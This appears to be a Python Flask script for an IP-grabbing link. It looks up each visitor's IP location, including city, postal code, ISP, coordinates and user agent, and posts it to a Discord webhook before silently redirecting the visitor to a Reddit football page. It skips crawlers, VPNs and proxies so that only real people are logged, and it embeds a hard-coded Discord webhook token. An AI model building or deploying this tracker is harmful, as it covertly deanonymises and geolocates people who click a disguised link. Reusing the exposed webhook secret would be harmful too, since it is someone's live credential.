from flask import Flask, request, redirect, abort
import requests
from datetime import datetime

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"

BOT_KEYWORDS = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
    "YandexBot", "Sogou", "Exabot", "facebot", "facebookexternalhit",
    "ia_archiver", "python-requests", "Go-http-client"
]

def get_client_ip():
    headers = ["X-Forwarded-For", "X-Real-IP"]
    for h in headers:
        ip = request.headers.get(h)
        if ip:
            if "," in ip:
                ip = ip.split(",")[0].strip()
            return ip
    return request.remote_addr

def is_bot_or_vpn(info, user_agent):
    ua = user_agent.lower()
    for keyword in BOT_KEYWORDS:
        if keyword.lower() in ua:
            return True
    security = info.get("security", {})
    if security.get("vpn") or security.get("proxy") or security.get("hosting"):
        return True
    return False

def get_ip_info(ip):
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        return resp.json()
    except:
        return {}

@app.route('/')
def index():
    ip = get_client_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    info = get_ip_info(ip)

    if is_bot_or_vpn(info, user_agent):
        abort(404)

    city = info.get("city", "Unknown")
    region = info.get("region", "Unknown")
    country = info.get("country_name", "Unknown")
    postal = info.get("postal", "Unknown")
    isp = info.get("org", "Unknown")
    lat = info.get("latitude", 0)
    lon = info.get("longitude", 0)
    google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"

    now = datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")

    message = {
        "content": (
            f"🚶 **New Visitor Detected**\n"
            f"🖥️ IP: `{ip}`\n"
            f"📍 Location: {city}, {region}, {country}\n"
            f"📫 Postal: {postal}\n"
            f"🏢 ISP: {isp}\n"
            f"🌍 Google Maps: {google_maps_link}\n"
            f"📱 User Agent: {user_agent}\n"
            f"🕒 Time: {now}"
        )
    }

    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=message, timeout=5)
        print(f"[INFO] Discord webhook sent: {r.status_code}")
    except Exception as e:
        print(f"[ERROR] Webhook failed: {e}")

    # Redirect real visitors to your Reddit page
    return redirect(REDIRECT_URL, code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
